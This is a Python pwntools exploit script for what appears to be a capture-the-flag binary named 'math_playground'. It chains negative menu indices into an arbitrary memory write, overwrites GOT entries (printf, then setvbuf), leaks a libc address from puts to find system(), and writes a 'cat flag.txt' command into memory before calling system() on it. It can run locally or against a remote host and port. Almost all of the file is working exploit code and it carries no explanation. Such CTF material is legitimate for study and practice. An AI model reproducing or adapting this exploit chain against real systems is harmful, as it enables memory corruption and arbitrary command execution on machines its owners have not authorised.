#!/usr/bin/env python3
import ctypes
import os
import subprocess
from pwn import *

context.update(os="linux", arch="i386")
context.log_level = "error"

BIN_PATH = args.BIN or "./math_playground"
LIBC_PATH = args.LIBC or "/usr/lib/i386-linux-gnu/libc.so.6"
HOST = args.HOST or "localhost"
PORT = int(args.PORT or 5000)

elf = ELF(BIN_PATH, checksec=False)
libc = ELF(LIBC_PATH, checksec=False)

FMT_D = 0x804A064
LOOP_ADDR = 0x8049276
PRINTF_GOT = elf.got["printf"]
PUTS_GOT = elf.got["puts"]
SETVBUF_GOT = elf.got["setvbuf"]
OPS = elf.symbols["operations"]


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    bin_abs = os.path.abspath(BIN_PATH)
    return process(
        [bin_abs],
        cwd=os.path.dirname(bin_abs),
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )


def i32(x: int) -> int:
    return ctypes.c_int32(x).value


def write_int(io, addr: int, value: int):
    io.sendline(b"-2")
    io.recvuntil(b"Enter two integers:\n")
    io.sendline(f"{FMT_D} {addr}".encode())
    io.sendline(str(i32(value)).encode())


def main():
    io = start()

    io.recvuntil(b"Enter your choice: ")

    # Stage 1: hijack the final printf("%d\\n", res) into the re-entry point inside main.
    io.sendline(b"-2")
    io.recvuntil(b"Enter two integers:\n")
    io.sendline(f"{FMT_D} {PRINTF_GOT}".encode())
    io.sendline(str(LOOP_ADDR).encode())

    # Stage 2: leak puts@libc.
    io.sendline(b"-4")
    io.recvuntil(b"Enter two integers:\n")
    io.sendline(f"{PUTS_GOT} 0".encode())
    leak = io.recvrepeat(0.5)
    puts_addr = u32(leak[:4])
    libc.address = puts_addr - libc.symbols["puts"]
    system_addr = libc.symbols["system"]

    log.info(f"puts@libc   = {hex(puts_addr)}")
    log.info(f"libc base   = {hex(libc.address)}")
    log.info(f"system@libc = {hex(system_addr)}")

    # Stage 3: write "cat flag.txt\\0" into writable data.
    cmd_chunks = [0x20746163, 0x67616C66, 0x7478742E, 0x0]
    for i, chunk in enumerate(cmd_chunks):
        write_int(io, OPS + 4 * i, chunk)

    # Stage 4: repoint setvbuf@got to system.
    write_int(io, SETVBUF_GOT, system_addr)

    # Stage 5: choice -3 now calls system(operations).
    io.sendline(b"-3")
    io.recvuntil(b"Enter two integers:\n")
    io.sendline(f"{OPS} 0".encode())

    data = io.recvrepeat(1)
    print(data.decode("latin-1", errors="ignore"))


if __name__ == "__main__":
    main()
